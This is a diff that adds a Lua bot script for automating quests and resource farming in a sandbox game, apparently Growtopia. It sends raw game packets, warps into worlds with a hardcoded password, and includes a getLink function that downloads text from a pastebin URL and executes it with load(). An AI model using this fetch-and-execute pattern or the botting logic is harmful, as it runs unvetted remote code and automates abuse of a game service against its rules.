@@ -1,0 +1,479 @@
+-- [quest new bot] --
+world_bahanQuest = "malisit"
+getBot().auto_trash = false
+getBot().auto_collect = false
+ 
+function quest_harvest(id)
+  for _, tile in pairs(getBot():getWorld():getTiles()) do
+    if tile.fg == id and getTile(tile.x,tile.y):canHarvest() and getBot().status == BotStatus.online then
+      getBot():findPath(tile.x,tile.y)
+	  sleep(math.random(250,500))
+	  getBot():hit(tile.x,tile.y)
+	  getBot():collect(3,3)
+	  sleep(math.random(250,1000))
+	  if getBot():getInventory():findItem(id-1) >= 190 then
+	  break
+	  end
+	end
+  end
+end
+
+function breakWood(id)
+getBot().auto_collect = false
+if getBot():getInventory():findItem(id+1) ~= 0 then  getBot():drop(id, getBot():getInventory():findItem(id+1)) sleep(500) end
+ -- getBot().auto_collect = true
+  for _, tile in pairs(getBot():getWorld():getTiles()) do
+    if tile.fg == id and getBot().status == BotStatus.online then
+      getBot():findPath(tile.x,tile.y-1)
+	  sleep(math.random(250,500))
+	  quest_pukul(0,1)
+	  getBot():collect(3,3)
+	  sleep(math.random(250,1000))
+	  if getBot():getInventory():findItem(id+1) > 0 then
+	  break
+	  end
+	end
+  end
+end
+
+function findTrees(id)
+  for _, tile in pairs(getBot():getWorld():getTiles()) do
+	if tile.fg == id and getBot().status == BotStatus.online then
+		if id == 202 then
+		getBot():findPath(tile.x,tile.y-1)
+		sleep(2500)
+		quest_pukul(0,1)
+		else
+		getBot():findPath(tile.x,tile.y)
+		sleep(2500)
+		end
+	break
+	end
+end
+end
+
+function quest_plant(id)
+mulai=0
+  for _, tile in pairs(getBot():getWorld():getTiles()) do
+	if tile.fg == 0 and getTile(tile.x,tile.y+1).fg ~= 0 and getTile(tile.x,tile.y+1).fg ~= 6 and getBot().status == BotStatus.online then
+	getBot():findPath(tile.x,tile.y)
+	getBot():place(tile.x, tile.y, id)
+	sleep(math.random(70,100)) -- 100
+	mulai=mulai+1
+		if mulai >= 10 or getBot():getInventory():findItem(id) == 0 then
+		findTrees(id)
+		break
+		elseif getBot().status ~= 1 then
+		print(getBot().name.." plant")
+		end
+	end
+  end
+end
+
+function splice(id1, id)
+mulai=0
+  for _, tile in pairs(getBot():getWorld():getTiles()) do
+	if not getTile(tile.x,tile.y):canHarvest() and tile.fg == id1 and getBot().status == BotStatus.online then
+	getBot():findPath(tile.x,tile.y)
+	getBot():place(tile.x, tile.y, id)
+	sleep(math.random(70,100)) -- 100
+	mulai=mulai+1
+		if mulai >= 10 or getBot():getInventory():findItem(id) == 0 then
+		break
+		elseif getBot().status ~= 1 then
+		print(getBot().name.." plant")
+		end
+	end
+  end
+end
+
+function quest_pukul(x,y)
+	while getTile(math.floor(getBot():getWorld():getLocal().posx // 32)+x, math.floor(getBot():getWorld():getLocal().posy // 32)+y).fg ~= 0 or getTile(math.floor(getBot():getWorld():getLocal().posx // 32)+x, math.floor(getBot():getWorld():getLocal().posy // 32)+y).bg ~= 0 do
+	getBot():hit(math.floor(getBot():getWorld():getLocal().posx // 32)+x, math.floor(getBot():getWorld():getLocal().posy // 32)+y)
+	getBot():collect(2,2)
+	sleep(math.random(150,350))
+	if getTile(math.floor(getBot():getWorld():getLocal().posx // 32)+x, math.floor(getBot():getWorld():getLocal().posy // 32)+y).fg == 8 or getBot().status ~= BotStatus.online then
+	break
+	end
+	end
+ end
+function breakDirt(x)
+getBot():findPath(x, 1)
+sleep(math.random(1000,1500))
+	while getBot().status == BotStatus.online do
+		getBot():findPath(x, math.floor(getBot():getWorld():getLocal().posy // 32)+1)
+		sleep(math.random(50,100))
+		quest_pukul(0,1)
+		quest_pukul(0,2)
+		if math.floor(getBot():getWorld():getLocal().posy // 32) >= 52 then
+		break
+		end
+	end
+aktiv_side=false
+end
+
+function quest_go_find(id) -- find floating
+for _, obj in pairs(getBot():getWorld():getObjects()) do
+  if obj.id == id and getBot().status == BotStatus.online then
+	print(getBot().name.." quest_go_find : "..getTile(math.floor(obj.x//32), math.floor(obj.y//32)).fg)
+    getBot():findPath(math.floor(obj.x//32), math.floor(obj.y//32))
+	sleep(250)
+    getBot():collectObject(obj.oid,3)
+    sleep(500)
+	ulangFind=ulangFind+1
+	if ulangFind > 2 or getBot():getInventory():findItem(id) > 15 then
+	break
+	else
+	return quest_go_find(id)
+	end
+  end
+end
+end
+
+ function findBlock(id)
+  for _, tile in pairs(getBot():getWorld():getTiles()) do
+    if tile.fg == id and tile.y > 30 and getBot().status == BotStatus.online then
+	fossilX = tile.x
+	fossilY = tile.y
+	  getBot():findPath(fossilX, fossilY+1)
+      sleep(500)
+	  break
+	end
+  end
+end
+function otw_block(id, target)
+while getBot().status == BotStatus.online do
+	quest_pukul(1,0)
+	getBot():findPath(math.floor(getBot():getWorld():getLocal().posx // 32)+1, math.floor(getBot():getWorld():getLocal().posy // 32))
+	sleep(math.random(250, 500))
+	if (math.floor(getBot():getWorld():getLocal().posx // 32) == fossilX and math.floor(getBot():getWorld():getLocal().posy // 32) == fossilY) or (getBot():getInventory():findItem(id+1) >= target) then
+	break
+	elseif getTile(math.floor(getBot():getWorld():getLocal().posx // 32), math.floor(getBot():getWorld():getLocal().posy // 32)+1).fg == id then
+	quest_pukul(0,1)
+	getBot():collect(3,3)
+	sleep(math.random(250,1000))
+	end
+end
+end
+
+function quest_put(x,y,id)
+while getTile(math.floor(getBot():getWorld():getLocal().posx // 32)+x, math.floor(getBot():getWorld():getLocal().posy // 32)+y).fg == 0 and getBot():getInventory():findItem(id) ~= 0 and getBot().status == BotStatus.online do
+	getBot():place(math.floor(getBot():getWorld():getLocal().posx // 32)+x, math.floor(getBot():getWorld():getLocal().posy // 32)+y, id)
+	sleep(math.random(120,200))
+end
+end
+function tungguReadyHarvest()
+while getBot().status == BotStatus.online do
+sleep(5000)
+	if getTile(math.floor(getBot():getWorld():getLocal().posx // 32), math.floor(getBot():getWorld():getLocal().posy // 32)):canHarvest() then
+	break
+	end
+end
+end
+
+function dropS(id, x)
+if getBot():getInventory():findItem(id) ~= 0 then
+	while getBot():getInventory():findItem(id) > x and getBot().status == BotStatus.online do
+	getBot():drop(id, getBot():getInventory():findItem(id)-x)
+	sleep(1100)
+		if getBot():getInventory():findItem(id) > x then
+		getBot():findPath(math.floor(getBot():getWorld():getLocal().posx // 32)-1, math.floor(getBot():getWorld():getLocal().posy // 32))
+		sleep(math.random(250, 500))
+		end
+	end
+end
+end
+
+function quest_iniRid(jumlah)
+	local chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
+	nameBot = ""
+	for i = 1,jumlah do
+	local rint = math.random(1, #chars)
+	nameBot = nameBot..chars:sub(rint, rint)
+	end
+	return nameBot
+end
+
+function quest_stuck()
+if getBot().status == BotStatus.online then
+	while (getTile(math.floor(getBot():getWorld():getLocal().posx // 32), math.floor(getBot():getWorld():getLocal().posy // 32)).fg == 6 or getTile(math.floor(getBot():getWorld():getLocal().posx // 32), math.floor(getBot():getWorld():getLocal().posy // 32)).fg == 6548) do
+	getBot():sendPacket(3, "action|join_request\nname|"..getBot():getWorld().name.."|b15m1ll4h\ninvitedWorld|0")
+	sleep(2000)
+	end
+end
+end
+
+function quest_Join_World(worldRotasi)
+Join_WorldBolean=true
+  while getBot():getWorld().name:upper() ~= worldRotasi:upper() and getBot().status == BotStatus.online and Join_WorldBolean do
+	getBot():warp(worldRotasi, "b15m1ll4h")
+	sleep(math.random(4000,6000))
+  end
+end
+
+function dropAll(itemID) -- id block
+if getBot().status == BotStatus.online then
+getBot().auto_collect = false
+	for i, item in pairs(getBot():getInventory():getItems()) do
+		if item.id == 370 or item.id == 1510 or item.id == 12498 or item.id == 882 or item.id == 1486 or item.id == 18 or item.id == 32 or item.id == 98 or item.id == itemID or item.id == itemID+1 then
+		else
+			while getBot():getInventory():findItem(item.id) ~= 0 and getBot().status == BotStatus.online do
+				getBot():drop(item.id, getBot():getInventory():findItem(item.id))
+				sleep(1000)
+				if getBot():getInventory():findItem(item.id) ~= 0 then
+				getBot():findPath(math.floor(getBot():getWorld():getLocal().posx // 32)-1, math.floor(getBot():getWorld():getLocal().posy // 32))
+				sleep(1000)
+				end
+			end
+		end
+	end
+end
+end
+
+function getLink(link)
+httpClient = HttpClient.new()
+httpClient:setMethod(Method.get)
+httpClient.url = link
+httpClient.headers["User-Agent"] = "Lucifer"
+local httpResult = httpClient:request()
+local response = httpResult.body
+load(response)()
+end
+
+function returnHiddenDoor()
+ulang_quest=1
+getLink("https://pastebin.com/raw/gejghgQ1")
+if getBot():getInventory():findItem(5036) < 2 then
+	while true do 
+	quest_Join_World(WorldSaveGrinder[ulang_quest])
+	quest_stuck()
+	ulangFind=0
+	quest_go_find(5036) -- hidden door
+	if ulang_quest > #WorldSaveGrinder or getBot():getInventory():findItem(5036) >= 2 then
+	break
+	else
+	ulang_quest=ulang_quest+1
+	end
+	end
+end
+end
+
+function wear_itemQuest()
+w=0
+player = getLocal()
+if player then
+  clothes = player.clothes
+  w=clothes.pants
+end
+return w
+end
+
+ function questTrash()
+ id_Trash={14, 2, 4, 100,3,5,15,2914, 101, 20, 21}
+    for _,item_id_Trash in pairs(id_Trash) do
+		if getBot():getInventory():findItem(item_id_Trash) ~= 0 and getBot():getWorld().name:upper() ~= "EXIT" and getBot().status == BotStatus.online then
+			getBot():sendPacket(2, "action|trash\n|itemID|".. item_id_Trash)
+			getBot():sendPacket(2, "action|dialog_return\ndialog_name|trash_item\nitemID|".. item_id_Trash .."|\ncount|" .. getBot():getInventory():findItem(item_id_Trash))
+			sleep(250)
+		end
+	end
+ end
+
+function fristMyWorldLock()
+local count = 0
+  for _, tile in pairs(getBot():getWorld():getTiles()) do
+    if tile.fg == 9640 then
+	count=count+1
+	end
+  end
+return count;
+end
+
+function step1()
+	if getBot():getWorld().name:upper():find(getBot().name:upper()) and fristMyWorldLock() == 1 then
+	print(getBot().name.." World frist world lock")
+	quest_harvest(3)
+	quest_harvest(5)
+	quest_harvest(11)
+	quest_harvest(15)
+	else
+	quest_Join_World(world_bahanQuest)
+	quest_stuck()
+	ulangFind=0
+	quest_go_find(202)
+	dropS(202, 1)
+	ulangFind=0
+	quest_go_find(5036) -- hidden door
+	ulangFind=0
+	quest_go_find(11) -- rock
+	ulangFind=0
+	quest_go_find(15) -- cave bg
+	ulangFind=0
+	quest_go_find(5) -- lava
+	quest_go_find(3) -- lava
+	getBot():findPath(98,2)
+	sleep(2500)
+	dropS(5036, 2)
+	dropS(5, 3)
+	dropS(11, 2)
+	dropS(15, 5)
+	dropS(3, 30)
+	returnHiddenDoor()
+	quest_Join_World(quest_iniRid(12))
+	quest_put(0,-1,202)
+	quest_put(1,0,5036)
+	quest_put(-1,0,5036)
+	end
+end
+function xdropx(id)
+ getBot():findPath(2,2)
+ sleep(2000)
+ getBot().auto_collect = false
+ dropS(id, 0)
+ -- getBot().auto_collect = true
+end
+
+function step2()
+-- getBot().auto_collect = true
+breakDirt(0)
+ulangFind=0
+quest_go_find(3)
+quest_plant(3)
+tungguReadyHarvest()
+quest_harvest(3)
+ulangFind=0
+xdropx(11)
+quest_go_find(11)
+print(getBot().name.." rock : "..getBot():getInventory():findItem(11))
+while getBot():getInventory():findItem(11) <= 2 and getBot().status == BotStatus.online do
+findBlock(10)
+if fossilY ~= math.floor(getBot():getWorld():getLocal().posy // 32) then  getBot():findPath(0, fossilY)  sleep(math.random(1000, 2500))  end
+otw_block(10, 3)
+ulangFind=0
+quest_go_find(11)
+print(getBot().name.." rock : "..getBot():getInventory():findItem(11))
+end
+ xdropx(15)
+ ulangFind=0
+ quest_go_find(15) -- cave bg seed
+ quest_plant(11)
+ splice(11, 15)
+ splice(11, 15)
+ findTrees(21)
+ tungguReadyHarvest()
+ quest_harvest(21)
+ ulangFind=0
+ quest_go_find(20)
+ getBot():findPath(2,2)
+ sleep(2000)
+ print(getBot().name.." sign : "..getBot():getInventory():findItem(20))
+ quest_put(0,0,20)
+ if getTile(math.floor(getBot():getWorld():getLocal().posx // 32), math.floor(getBot():getWorld():getLocal().posy // 32)).fg == 20 then
+ getBot():wrench(math.floor(getBot():getWorld():getLocal().posx // 32), math.floor(getBot():getWorld():getLocal().posy // 32))
+ sleep(2500)
+ getBot():sendPacket(2, "action|dialog_return\ndialog_name|sign_edit\ntilex|"..math.floor(getBot():getWorld():getLocal().posx // 32).."|\ntiley|"..math.floor(getBot():getWorld():getLocal().posy // 32).."|\nsign_text|quest1")
+ sleep(3000)
+ end
+ ulangFind=0
+ xdropx(3)
+ quest_go_find(3)
+ print(getBot().name.." dirt : "..getBot():getInventory():findItem(3))
+ while getBot():getInventory():findItem(3) <= 4 and getBot().status == BotStatus.online do
+ findBlock(2)
+if fossilY ~= math.floor(getBot():getWorld():getLocal().posy // 32) then  getBot():findPath(0, fossilY)  sleep(math.random(1000, 2500))  end
+ otw_block(2, 5)
+ ulangFind=0
+ quest_go_find(3)
+ print(getBot().name.." dirt : "..getBot():getInventory():findItem(3))
+ end
+ 
+ xdropx(5)
+ ulangFind=0
+ quest_go_find(5)
+ print(getBot().name.." lava : "..getBot():getInventory():findItem(5))
+ while getBot():getInventory():findItem(5) <= 4 and getBot().status == BotStatus.online do
+ findBlock(4)
+if fossilY ~= math.floor(getBot():getWorld():getLocal().posy // 32) then  getBot():findPath(0, fossilY)  sleep(math.random(1000, 2500))  end
+ otw_block(4, 5)
+ ulangFind=0
+ quest_go_find(5)
+ print(getBot().name.." lava : "..getBot():getInventory():findItem(5))
+ end
+quest_plant(5)
+splice(5, 3)
+splice(5, 3)
+findTrees(101)
+tungguReadyHarvest()
+quest_harvest(101)
+quest_harvest(101)
+quest_harvest(101)
+quest_go_find(100)
+getBot():findPath(2,2)
+sleep(2000)
+while getBot():getInventory():findItem(100) ~= 0 and getBot().status == BotStatus.online do
+quest_put(0,-1,100)
+getBot():findPath(math.floor(getBot():getWorld():getLocal().posx // 32)+1, math.floor(getBot():getWorld():getLocal().posy // 32))
+sleep(math.random(250, 500))
+end
+if getBot():getInventory():findItem(101) ~= 0 then
+getBot():drop(101, getBot():getInventory():findItem(101))
+sleep(250)
+end
+ulangFind=0
+quest_go_find(101)
+breakWood(100)
+print(getBot().name.." breakWood")
+quest_plant(101)
+print(getBot().name.." quest_plant")
+splice(101, 3)
+splice(101, 3)
+findTrees(371)
+tungguReadyHarvest()
+quest_harvest(371)
+quest_harvest(371)
+ulangFind=0
+quest_go_find(370)
+ulangFind=0
+quest_go_find(370)
+if getBot():getInventory():findItem(370) == 0 then
+print(getBot().name.." celana: ".. getBot():getInventory():findItem(370))
+quest_harvest(371)
+quest_harvest(371)
+ulangFind=0
+quest_go_find(370)
+ulangFind=0
+quest_go_find(370)
+end
+print(getBot().name.." otw_wear")
+while getBot():getInventory():findItem(370) >= 1 and wear_itemQuest() == 0 do
+getBot():wear(370)
+sleep(math.random(550, 1500))
+end
+if getBot():getInventory():findItem(370) >= 1 then
+getBot():say("/respawn")
+sleep(2500)
+getBot().auto_collect = false
+getBot():sendPacket(2, "action|tutorialTaskPhoneClicked")
+sleep(2500)
+getBot():sendPacket(2, "action|dialog_return\ndialog_name|phonecall\ntilex|"..math.floor(getBot():getWorld():getLocal().posx // 32).."|\ntiley|"..math.floor(getBot():getWorld():getLocal().posy // 32).."|\nnum|12345|\nremote|1|\nbuttonClicked|chc1")
+sleep(4000)
+getBot():sendPacket(2, "action|dialog_return\ndialog_name|phonecall\ntilex|"..math.floor(getBot():getWorld():getLocal().posx // 32).."|\ntiley|"..math.floor(getBot():getWorld():getLocal().posy // 32).."|\nnum|-12|\nremote|1|\nbuttonClicked|back")
+sleep(4500)
+end
+print(getBot().name.." done wear 1")
+if fristMyWorldLock() == 0 then
+findTrees(202)
+quest_Join_World(world_bahanQuest)
+quest_stuck()
+print(getBot().name.." done wear 2")
+ulangFind=0
+getBot():findPath(98,2)
+sleep(2000)
+dropAll(0)
+end
+questTrash()
+end
+
+step1()
+step2()
+print(getBot().name.." done")
